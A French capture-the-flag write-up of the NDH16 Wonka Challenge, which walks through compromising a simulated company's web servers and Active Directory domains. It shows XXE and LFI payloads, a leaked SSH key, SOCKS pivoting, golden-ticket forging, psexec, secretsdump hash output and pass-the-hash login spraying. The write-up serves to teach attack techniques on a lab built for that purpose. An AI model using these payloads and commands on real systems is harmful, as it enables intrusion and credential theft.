# Le Wonka Challenge

Le Wonka Challenge était proposé par la société Akerva pendant la NDH16 et fut laissé en ligne après l'événement pendant un certain temps.  
Ce challenge était réaliste, car il reproduisait le SI d'une société. Très intéressant pour apprendre les diverses techniques d'attaque des AD.  
Il était composé de 7 étapes plus ou moins techniques, mais demandant à chaque fois de nouvelles attaques.  
De plus, l'infrastructure mise en place était réinitialisée toutes les heures.
Ca permettait d'évoluer tout en sachant que si une bêtise était faite, celle-ci ne pénaliserait pas les joueurs trop longtemps.

## Prêt ? Alors Go !

Tout d'abord, on va lire les règles disponibles sur challenge.akerva.fr.

![Règle du Wonka Challenge](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag1/rules.png)

On y apprend que l'on souhaite infiltrer la société Pramacorp.  
Chance pour nous, un de nos contacts nous apprend qu'un ticket d'or (golden ticket) est à vendre sur le site willywonka.shop:4242 pour une filiale, pramafil.com, de Pramacorp.
Le ticket d'or est un fichier vous donnant tous les droits sur un active directory utilisant Kerberos.
Nous avons les cibles des deux premiers flags. Les flags sont situés à la racine des serveurs dans le fichier flag.txt (c'était indiqué sur l'interface de validation des flags).

## En route pour la chocolaterie (flag 1) 

### Découverte du site

On va sur le site de willywonka.shop

![willywonka shop](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag1/shop.png)

En parcourant le site, on se rend compte que la seule page intéressante est la page d'upload, les autres étant des pages HTML classiques sans informations (extension .html et .php pour la page d'upload).

![interface d'upload](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag1/upload_example.png)

On découvre donc un exemple de ce qui est attendu par le système. On télécharge l'archive pour ensuite l'extraire (j'ai testé unzip et ça a fonctionné de premiers coups).  
Celle-ci est composée d’un fichier XML et un fichier kirbi (l'extension kirbi est l'extension pour les tickets Kerberos).

Contenu du fichier MANIFEST.xml :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <entreprise>xxx</entreprise>
    <prixBTC>xxx BTC</prixBTC>
    <adresseBTC>xxx</adresseBTC>
</root>
```

On rejoue l'exemple. L'archive et son contenu sont bien traités par le système, car la page de retour affiche le contenu du Manifest.

![exemple de l'upload](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag1/upload_example.png)

Un fichier XML qui est traité par un système, tout indique une XXE. On aurait aussi pu penser à une XSS sur la plateforme de validation de l'administrateur.

### Exploitation de la XXE

On sort les payloads XXE de leur boite. Pourquoi pas de ne pas tenter de lire le ficher /etc/passwd du serveur.
L'extension de la page d'upload étant `.php`, on n'oublie pas le php filter qui va nous permettre de récupérer le contenu du fichier ciblé quelque soit son formatage.

Payload: 

`php://filter/convert.base64-encode/resource=/etc/passwd`

Voici le MANIFEST.xml avec la XXE :


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE entreprise [  
<!ELEMENT entreprise ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
    <entreprise>&xxe;</entreprise>
    <prixBTC>xxx BTC</prixBTC>
    <adresseBTC>xxx</adresseBTC>
</root>
```

Le résultat est immédiat :

```
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHJvb3Q+Cgk8ZW50cmVwcmlzZT5QUkFNQUZJTDwvZW50cmVwcmlzZT4KCTxwcml4QlRDPjEyIEJUQzwvcHJpeEJUQz4KCTxhZHJlc3NlQlRDPjNKRFNZeERWWXF0aDFVaUdSZlVmc2UzREo3SDNGSDhlQzE8L2FkcmVzc2VCVEM+CgoJPGRvbWFpbj5QUkFNQUZJTDwvZG9tYWluPgoJPGFkbWluPkFkbWluaXN0cmF0b3I8L2FkbWluPgoJPHNpZD5TLTEtNS0yMS0xNTQxODE3MjE5LTMxOTUxMDA0MDQtNDA4ODgzMjg2Njwvc2lkPgoJPGtyYnRndD40ZDVlMDYxNzcyMGVlNWVhZjIxODMwZmQ4ZDhmNzVlYTwva3JidGd0Pgo8L3Jvb3Q+Cgo=
```

Et voilà le passwd :
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
_apt:x:106:65534::/nonexistent:/bin/false
lxd:x:107:65534::/var/lib/lxd/:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
anonymous:x:1000:1000:anonymous,,,:/home/anonymous:/bin/bash
```

Celui-ci ne contient pas d'informations, mais on a tout ce qu'il faut pour récupérer le flag.

### Le flag !

On va donc lire le fichier /flag.txt

Payload : 

`php://filter/convert.base64-encode/resource=/flag.txt`

C'est immédiat :

* d29ua2F3b25rYXdvbmthaGFoYWhhX2lMT09PT09PT09PVkUK 

![le flag](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag1/flag.png)

Et voilà le flag de cette étape : `wonkawonkawonkahahaha_iLOOOOOOOOOVE`
Première étape réalisée ! Le deuxième site web maintenant.

## Le commerce du phoque (flag 2) 

### Découvert du site web

Pramafil est une société dans la vente (scandaleuse soit dit en passant) d'objets en peau de phoque ! 
* `http://pramafil.com/`  

![pramafil](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag2/pramafil.png)

C'est un site one-page sans grand intérêt sauf, sauf (car il y a toujours un sauf) au niveau de ces CGU, (les phoques ce n'est pas très grave, mais quand même les CGU c'est important).  
En effet, les CGU ne sont pas sur la one-page, mais sur une page à part. Voici son url: `http://pramafil.com/cgu/?v=2018`

On tente une LFI sur le fichier /etc/passwd. Et ... et ... Jackpot, on a trouvé notre point d'entrée.

![lfi](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag2/lfi_etc_passwd.png)

### Le flag

Il ne reste plus qu'à afficher le flag.

![le flag](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag2/flag.png)

Et voilà le flag de cette étape : `@llez_le$_BLEU$!!!` 

## Infiltrer Pramafil en compromettant son Active Directory (flag 3)

A partir de cette étape, nous devons infiltrer le réseau interne de pramacorp. Pour ce faire, il y a plusieurs étapes. La première sera de récupérer un maximum de droits sur le domaine pramafil.corp (flag 3) puis ensuite compromettre le sous-domaine dev.pramacorp.fr (flag 4) pour enfin attaquer le domaine maitre pramacorp.fr (notre cible finale, flag 5).

Bon, un check des informations récupérées s'impose.  
On possède un moyen sur les deux domaines pour récupérer des informations.  
Le site du challenge nous indique que l'on doit récupérer le hash de l'adminstrateur:500 du domaine pramafil.corp 

### Récupération d'informations sur pramafil.com

Il est plus facile de commencer par pramafil.com du fait de la lfi qui est très facile d'exploitation.  
De plus, on sait qu'il y a deux comptes de développeurs grâce au passwd.  

### Une clé perdue, 10 de retrouvés.  

[Panoptic](https://github.com/lightos/Panoptic) va nous aider à récupérer des informations au travers de la LFI. Cet outil n'était pas nécessaire, car les fichiers découverts sont tous à des emplacements bien connus du monde Linux.

```
./panoptic.py --url http://pramafil.com/cgu/\?v\=2018

 .-',--.`-.
<_ | () | _>
  `-`=='-'

Panoptic v0.1-df35a6c (https://github.com/lightos/Panoptic/)

[i] Starting scan at: 17:06:49

[i] Checking original response...
[i] Checking invalid response...
[i] Done!
[i] Searching for files...
[i] Possible file(s) found!
[i] OS: *NIX
[?] Do you want to restrict further scans to '*NIX'? [Y/n] Y
[+] Found '/etc/apache2/apache2.conf' (*NIX/HTTP server/conf).
[+] Found '/etc/apache2/envvars' (*NIX/HTTP server/conf).
[+] Found '/etc/apache2/mods-available/autoindex.conf' (*NIX/HTTP server/conf).
[+] Found '/etc/apache2/mods-available/mime.conf' (*NIX/HTTP server/conf).
[+] Found '/etc/apache2/mods-available/setenvif.conf' (*NIX/HTTP server/conf).
[+] Found '/etc/apache2/mods-available/ssl.conf' (*NIX/HTTP server/conf).
[+] Found '/etc/apache2/mods-enabled/mime.conf' (*NIX/HTTP server/conf).
[+] Found '/etc/dhcp/dhclient.conf' (*NIX/Network/conf).
[+] Found '/proc/self/mounts' (*NIX/other).
[+] Found '/proc/self/status' (*NIX/other).
[+] Found '/proc/cpuinfo' (*NIX/other).
[+] Found '/proc/meminfo' (*NIX/other).
[+] Found '/etc/bash.bashrc' (*NIX/*NIX).
[+] Found '/etc/sysctl.conf' (*NIX/conf).
[+] Found '/etc/security/access.conf' (*NIX/conf).
[+] Found '/etc/security/group.conf' (*NIX/conf).
[+] Found '/etc/security/limits.conf' (*NIX/conf).
[+] Found '/etc/security/namespace.conf' (*NIX/conf).
[+] Found '/etc/security/pam_env.conf' (*NIX/conf).
[+] Found '/etc/security/time.conf' (*NIX/conf).
[+] Found '/etc/ssh/sshd_config' (*NIX/conf).
[+] Found '/etc/adduser.conf' (*NIX/conf).
[+] Found '/etc/ca-certificates.conf' (*NIX/conf).
[+] Found '/etc/debconf.conf' (*NIX/conf).
[+] Found '/etc/hdparm.conf' (*NIX/conf).
[+] Found '/etc/ltrace.conf' (*NIX/conf).
[+] Found '/etc/manpath.config' (*NIX/conf).
[+] Found '/usr/share/adduser/adduser.conf' (*NIX/conf).
[+] Found '/etc/passwd' (*NIX/other).
[+] Found '/home/dev0/.bashrc' (*NIX/*NIX User File/conf).
[+] Found '/home/dev1/.bashrc' (*NIX/*NIX User File/conf).
[+] Found '/home/dev1/.ssh/id_rsa' (*NIX/*NIX User File/conf).
[+] Found '/etc/mtab' (*NIX/other).
[+] Found '/etc/login.defs' (*NIX/other).
[+] Found '/boot/grub/grub.cfg' (*NIX/other).
[+] Found '/boot/grub/menu.lst' (*NIX/other).
  
[i] File search complete.
```

Et là, stupeur, un développeur a uploadé sa clé privée sur le serveur. Ni une ni deux, on la récupère.

* http://pramafil.com/cgu/?v=/home/dev1/.ssh/id_rsa

Bingo, on avance.

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAs9jEXsYN/poSQoXJ56L8Rt+bokwANQCzwwUhsC6k1iiBZMkA
NHJT9P1vjN+4c4Y7AZks/dNL5orLqobzVnKO/kCeCz4fEqlFdvBtwp0hs+mteSB6
euH18O6qrIROTmY3tYFr7yU2xK1QRodV/Wx9BCXxTi0PfY6SDSpSufn2O1a6ErFo
K8uFEQ2yeHpEwfFc2Biz6NSOHOzJKB2wRbo8omYqkefww2JxWiz0cq5hF9j/yn8g
2ULUPjhfVGDYt0MIV9PgqxxrBKdvGKb4mNnLVxX8oR44lUxZk2Odg3cjtGS/my+l
Y1U5Nf8hyo8aHknwMRt7utapMXoSWcRU0AuhRwIDAQABAoIBAH88Iykdmzb9j1+K
```

On vérifie que le port 22 est bien ouvert sur le serveur de pramafil (IP:151.80.230.58):

```
nmap 151.80.230.58
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-03 17:14 CEST
Nmap scan report for 151.80.230.58
Host is up (0.017s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
4242/tcp open  vrml-multi-use
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
```

On tente une connexion en ssh.

```
ssh dev1@151.80.230.58 -i dev1.priv
Welcome to Ubuntu 17.10 (GNU/Linux 4.13.0-41-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Meltdown, Spectre and Ubuntu: What are the attack vectors,
   how the fixes work, and everything else you need to know
   - https://ubu.one/u2Know

58 paquets peuvent être mis à jour.
31 mises à jour de sécurité.

New release '18.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Wed Jun 20 16:59:22 2018 from 185.74.43.34
Connection to 151.80.230.58 closed.
```

On ne peut pas exécuter de commande sur le serveur. Résultat logique par rapport au /etc/passwd qui indiquait que le dev1 était en /bin/false.
Cependant, ce n'est pas perdu. On peut quand même utiliser ce serveur comme serveur de rebond !

```bash
ssh -D 9050 -N dev1@151.80.230.58 -i dev1.priv
```

### Qu'est-ce qu'il y a au bout du tunnel ?

On a créé un serveur de rebonds, mais pour aller où ? C'est une très bonne question. Étant donné que le serveur de pramafil est utilisé par des développeurs, ils ont du modifier le /etc/hosts pour faciliter les connexions avec des serveurs en interne. Une vérification du fichier hosts s'impose donc.

* http://pramafil.com/cgu/?v=/etc/hosts

```
127.0.0.1   localhost 
127.0.1.1   www.pramafil.com        www
10.10.0.207 preprod.pramafil.com    preprod 
10.10.0.202 dcfil.pramafil.corp     pramafil.corp 
10.10.0.203 ad.dev.pramacorp.fr     dev.pramacorp.fr 

# The following lines are desirable for IPv6 capable hosts 
::1 localhost ip6-localhost ip6-loopback 
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

On a maintenant les IP internes de l'entreprise Pramacorp.

### À la recherche du ticket d'or perdu

Bien joli tout ça, mais il nous manque quelque chose d'essentiel, un moyen d'usurper une identité sur l'active directory.  
En se rappelant l'énoncé, on sait qu'un ticket kerberos de pramafil.corp est à vendre sur willywonka.shop:4242.  
Les tickets sont donc stockés quelques part. Mais où ? À nous de le découvrir.  

On tente un upload d'un nouveau ticket sur le shop. On fait bien attention aux pages liés à cette manipulation, notamment les commentaires.
Le développeur du shop a souhaité renseigner le vendeur du ticket d'où il était stocké dans les commentaires de la page une fois l'upload terminé.

```
<!-- first need admin validation -->
<!-- then, will be saved in /home/willywonka/tickets/$filename/MANIFEST.xml and ticket.kirbi -->
```

Voilà un chemin très clair. Il ne reste plus qu'à trouver le $filename. Le premier essai sera pramafil (Rappelez-vous que le shop l'affiche en "available").

Payloads de la XXE:

```xml
<!DOCTYPE entreprise [  
<!ELEMENT entreprise ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/willywonka/tickets/pramafil/MANIFEST.xml">
]>
```

Résultat en base 64:

```
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHJvb3Q+Cgk8ZW50cmVwcmlzZT5QUkFNQUZJTDwvZW50cmVwcmlzZT4KCTxwcml4QlRDPjEyIEJUQzwvcHJpeEJUQz4KCTxhZHJlc3NlQlRDPjNKRFNZeERWWXF0aDFVaUdSZlVmc2UzREo3SDNGSDhlQzE8L2FkcmVzc2VCVEM+CgoJPGRvbWFpbj5QUkFNQUZJTDwvZG9tYWluPgoJPGFkbWluPkFkbWluaXN0cmF0b3I8L2FkbWluPgoJPHNpZD5TLTEtNS0yMS0xNTQxODE3MjE5LTMxOTUxMDA0MDQtNDA4ODgzMjg2Njwvc2lkPgoJPGtyYnRndD40ZDVlMDYxNzcyMGVlNWVhZjIxODMwZmQ4ZDhmNzVlYTwva3JidGd0Pgo8L3Jvb3Q+Cgo= 
```

Ce qui nous donne le manifest suivant :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <entreprise>PRAMAFIL</entreprise>
    <prixBTC>12 BTC</prixBTC>
    <adresseBTC>3JDSYxDVYqth1UiGRfUfse3DJ7H3FH8eC1</adresseBTC>

    <domain>PRAMAFIL</domain>
    <admin>Administrator</admin>
    <sid>S-1-5-21-1541817219-3195100404-4088832866</sid>
    <krbtgt>4d5e0617720ee5eaf21830fd8d8f75ea</krbtgt>
</root>
```

Chance pour nous, le manifest contient toutes les infos nécessaires pour créer un ticket d'or ! À nous la visite du domaine de Pramafil.corp.
Il est aussi possible de récupérer le ticket.kirbi pour le rejouer directement.

### Création du ticket d'or 

Pour cette étape, j'ai utilisé ticketer (dispo sous [impacket](https://github.com/CoreSecurity/impacket), je conseille l'utilisation d'un virtualenv), mais vous pouvez aussi utiliser Mimikatz avec Kékéo pour la conversion du `kirbi` en `ccache`.

```
impacket/examples/ticketer.py -nthash 4d5e0617720ee5eaf21830fd8d8f75ea -domain-sid S-1-5-21-1541817219-3195100404-4088832866 -domain PRAMAFIL Administrator
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for PRAMAFIL/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

Et voilà, on a un ticket d'or tout ce qu'il y a de plus valide.

### Proxychains et un peu de configuration

Pour utiliser le proxy SOCKS créé précédemment, on va utiliser [proxychains](https://github.com/haad/proxychains) avec sa configuration par défaut à un détail près. Certains préfèrons utiliser des solutions comme [Redsocks](https://github.com/darkk/redsocks). 

**Avec proxychains pensez à bien supprimer le proxydns dans /etc/proxychains.conf si vous avez des comportements étranges.**

On configure son fichier hosts pour renseigner des noms de domaines et non pas les IP des serveurs. Ne voulant pas prendre de risque, j'ai un peu surchargé le hosts récupéré avant.

```
10.10.0.202 dcfil.pramafil.corp pramafil.corp
10.10.0.202 DCFIL.PRAMAFIL.CORP PRAMAFIL.CORP
10.10.0.202 PRAMAFIL
10.10.0.203 ad.dev.pramacorp.fr dev.pramacorp.fr
10.10.0.203 AD.DEV.PRAMACORP.FR DEV.PRAMACORP.FR
10.10.0.203 DEV.PRAMACORP.FR
10.10.0.207 preprod.pramafil.com    preprod
10.10.0.207 PREPROD.PRAMAFIL.COM    PREPROD
```

Et bien nous sommes fin prêts à infiltrer Pramafil.com

### Metal Gear AD

J'ai utilisé les scripts impacket pour la suite. Metasploit fonctionnerait tout aussi bien.
Les scripts exemples dans impacket peuvent utiliser un ticket d'or si on renseigne le ccache dans la variable d'environnement KRB5CCNAME :`export KRB5CCNAME=Administrator.ccache`
Le ccache est le fichier créé par ticketer.

On commence par un petit psexec.
```
proxychains impacket/examples/psexec.py Administrator@dcfil.pramafil.corp -k -no-pass
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.202:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.202:88-<><>-OK
[*] Requesting shares on dcfil.pramafil.corp.....
[*] Found writable share ADMIN$
[*] Uploading file gQZqWdyq.exe
[*] Opening SVCManager on dcfil.pramafil.corp.....
[*] Creating service oewK on dcfil.pramafil.corp.....
[*] Starting service oewK.....
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.202:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.202:88-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.202:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.202:88-<><>-OK
[!] Press help for extra shell commands
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.202:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.202:88-<><>-OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Le ticket fonctionne donc correctement. On va utiliser secretdumps qui va extraire les hash pour nous.

```
proxychains impacket/examples/secretsdump.py Administrator@dcfil.pramafil.corp -k -no-pass

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] Target system bootKey: 0xddb5bc4404915a7d530c6bda9164dc3d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:90b46b849c3f17a268abb06a39c25fb4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:5dff2a6203bc4e53f0510a2868018039:::
[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PRAMAFIL\DCFIL$:aad3b435b51404eeaad3b435b51404ee:6a7a6007fdb7b82c61dda608f599d4e6:::
[*] DefaultPassword 
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM 
 0000   01 00 00 00 A4 65 A2 11  C0 40 E2 C5 CA 4E E0 D4   .....e...@...N..
 0010   32 A8 BB 25 20 8C FB EC  22 20 17 B3 80 E1 84 49   2..% ..." .....I
 0020   0A 2F 86 91 5C 54 68 3F  7E 28 05 58               ./..\Th?~(.X
DPAPI_SYSTEM:01000000a465a211c040e2c5ca4ee0d432a8bb25208cfbec222017b380e184490a2f86915c54683f7e280558
[*] NL$KM 
 0000   2B ED AB 03 48 CB E1 07  9B A3 4D FA 70 AB E1 EB   +...H.....M.p...
 0010   14 67 15 7A DB 28 F0 4D  3C B3 B7 34 45 68 83 CB   .g.z.(.M<..4Eh..
 0020   77 1E 98 24 2F 36 FC 65  B3 E0 70 80 ED 8A 66 B1   w..$/6.e..p...f.
 0030   12 37 EA 13 FA A1 5A F5  95 0A 29 44 0A 5B 50 12   .7....Z...)D.[P.
NL$KM:2bedab0348cbe1079ba34dfa70abe1eb1467157adb28f04d3cb3b734456883cb771e98242f36fc65b3e07080ed8a66b11237ea13faa15af5950a29440a5b5012
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] Could not connect: [Errno 111] Connection refused
[*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
```

Il semble que l'on ait récupéré le hash de l'admin. Sauf que malheurement il ne permet pas de valider l'étape. 
En regardant attentivement la sortie de secretdump, on se rend compte que le hash récupéré n'est pas le hash du domaine, mais un hash local.  
Comme nous le conseille le script, on ajoute l'option -use-vss pour récupérer les hashs au niveau du domaine.

```
proxychains impacket/examples/secretsdump.py Administrator@dcfil.pramafil.corp -k -no-pass -use-vss

[*] Reading and decrypting hashes from \\dcfil.pramafil.corp\ADMIN$\Temp\SVDhbYrk.tmp 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:568ec725---------------f30e38eec:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DCFIL$:1001:aad3b435b51404eeaad3b435b51404ee:6a7a6007fdb7b82c61dda608f599d4e6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4d5e0617720ee5eaf21830fd8d8f75ea:::
```

On a alors une liste de plein de compte avec leur hash NTLM associés (remarquer le NTLM du krbtgt qui correspond bien à celui récupéré au niveau du MANIFEST.xml de pramafil sur le shop).

Et voilà le flag de cette étape : 568ec725---------------f30e38eec

## Infiltration de la société mère par son sous-domaine (flag 4)

Pour rappel, nous devons infiltrer le réseau interne de pramacorp. Pour ce faire, il y a plusieurs étapes. La première sera de récupérer un maximum de droits sur le domaine pramafil.corp (flag 3) puis ensuite compromettre le sous-domaine dev.pramacorp.fr (flag 4) pour enfin attaquer le domaine maitre pramacorp.fr (notre cible finale, flag 5).

Pour cette étape, j'ai principalement utilisé Metasploit et Empire.  

Nous venons de rooter un premier domaine. Nous devons rooter dev.pramacorp.fr.
Pour commencer, utilisons les couples login/password que l'on a récupéré du 1er domaine sur le 2iéme en utilisant la faille la plus connue de tous, la réutilisation de mot de passe par les utilisateurs.  
Commençons par transformer les hashs récupérés en identifiants DB pour msf. 

```
msf > creds add user:FORESTIER ntlm:aad3b435b51404eeaad3b435b51404ee:1cc2fa4c90e482524bbe6b91c6e0c27b
msf > creds add user:BLONDEAU ntlm:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf > creds add user:ROQUES ntlm:aad3b435b51404eeaad3b435b51404ee:887b8bc8500824870785a42b333d6ef5
msf > creds add user:RICARD ntlm:aad3b435b51404eeaad3b435b51404ee:aa06c4e2acf15e71ce9a8c0fb2ea1a10
msf > creds add user:POMMIER ntlm:aad3b435b51404eeaad3b435b51404ee:5908b3a40ec0ba0f32c2502f4dd053fa
msf > creds add user:BITION ntlm:aad3b435b51404eeaad3b435b51404ee:27cbe43b98013e6e7a5c16fc484b4b6a
.......
```

Puis utilisons le scanner smb_login. Mais proxifions la connexion avant tout.

```
msf > setg Proxies socks4:127.0.0.1:9050
msf > set ReverseAllowProxy true
```

Et c'est parti.

```
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(scanner/smb/smb_login) > set DB_ALL_CREDS true
msf auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.0.203
msf auxiliary(scanner/smb/smb_login) > set THREADS 10
msf auxiliary(scanner/smb/smb_login) > run
[*] 10.10.0.203:445       - 10.10.0.203:445 - Starting SMB login bruteforce
[*] 10.10.0.203:445       - 10.10.0.203:445 - This system does not accept authentication with any credentials, proceeding with brute force
[-] 10.10.0.203:445       - 10.10.0.203:445 - Failed: 'WORKSTATION\DCFIL$:aad3b435b51404eeaad3b435b51404ee:6a7a6007fdb7b82c61dda608f599d4e6',
[*] 10.10.0.203:445       - 10.10.0.203:445 - Correct credentials, but unable to login: 'WORKSTATION\Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0',
[-] 10.10.0.203:445       - 10.10.0.203:445 - Failed: 'WORKSTATION\Administrator:aad3b435b51404eeaad3b435b51404ee:568ec725c6175131a23f330f30e38eec',
[+] 10.10.0.203:445       - 10.10.0.203:445 - Success: 'WORKSTATION\BITION:aad3b435b51404eeaad3b435b51404ee:27cbe43b98013e6e7a5c16fc484b4b6a'
[*] 10.10.0.203:445       - 10.10.0.203:445 - Domain is ignored for user BITION
[-] 10.10.0.203:445       - 10.10.0.203:445 - Failed: 'WORKSTATION\POMMIER:aad3b435b51404eeaad3b435b51404ee:5908b3a40ec0ba0f32c2502f4dd053fa',
```

Et hop, il est bien là. Vous savez l'utilisateur qui va utiliser un mot de passe identique pour tous ces services.
Le nom gagnant est BITION.  

On va donc se servir de ce user pour se connecter sur l'ad.dev.pramacorp.fr

```
proxychains impacket/examples/psexec.py BITION@ad.dev.pramacorp.fr -hashes aad3b435b51404eeaad3b435b51404ee:27cbe43b98013e6e7a5c16fc484b4b6a
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.203:445-<><>-OK
[*] Requesting shares on ad.dev.pramacorp.fr.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Share' is not writable.
[-] share 'SYSVOL' is not writable.
(impacket)
```

Pas de bol, aucun share n'est inscriptible. Mais surement ouvert en lecture, essayons.

```
proxychains impacket/examples/smbclient.py BITION@ad.dev.pramacorp.fr -hashes aad3b435b51404eeaad3b435b51404ee:27cbe43b98013e6e7a5c16fc484b4b6a 
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.203:445-<><>-OK
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Share
SYSVOL
# use Share
# ls
drw-rw-rw-          0  Thu May 17 13:45:48 2018 .
drw-rw-rw-          0  Thu May 17 13:45:48 2018 ..
-rw-rw-rw-        200  Wed May  9 11:04:17 2018 deploy_ckdrive.bat
drw-rw-rw-          0  Fri May 18 14:50:14 2018 Scripts
```

Nous pouvons y voir des scripts. Regardons leur contenus.

Contenu de deploy_ckdrive.bat :
```
REM DEPLOY SCHEDULED TASK ON ANY WINDOWS ON DEV DOMAIN FOR ADMINISTRATION PURPOSE
schtasks /create /RU system /sc minute /mo 5 /tn "deploy ckdrive" /tr \\ad.dev.pramacorp.fr\Share\Scripts\ckdrive.bat
```

Contenu de script ckdrive.bat :
```
REM INFO ABOUT DRIVE
IF EXIST C:\drive.log del C:\drive.log
@echo off
echo %time% > C:\drive.log
wmic logicaldisk get size,caption /format:value >> C:\drive.log
```

Bien bien, Une tâche avec les droits systèmes et qui utilise un script auquel nous avons accès. Eh bien, let's go, tentons d'uploader un agent Empire.  
Pourquoi Empire ? Il est vrai que dans un vrai domaine ce n'est pas vraiment discret, mais c'était l'occasion de le tester.
